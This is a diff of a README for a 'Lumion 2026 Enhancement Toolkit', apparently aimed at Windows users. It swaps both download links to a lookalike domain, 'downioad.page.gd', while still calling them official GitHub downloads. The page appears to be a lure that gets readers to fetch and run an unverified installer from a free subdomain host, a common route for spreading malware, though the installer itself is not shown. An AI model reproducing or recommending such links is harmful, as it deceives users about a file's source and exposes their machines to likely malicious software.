@@ -2,7 +2,7 @@
 
 Lumion 2026 Enhancement Toolkit is a specialized suite designed to elevate your Lumion experience by providing advanced material libraries, improved synchronization, and optimized rendering effects. This toolkit is tailored for Windows desktop users, offering a seamless way to enhance architectural visualization projects with increased efficiency and quality.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -84,4 +84,4 @@ For further assistance, you can refer to the documentation included with the too
 
 For the latest version of the Lumion 2026 Enhancement Toolkit, please use the official download link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
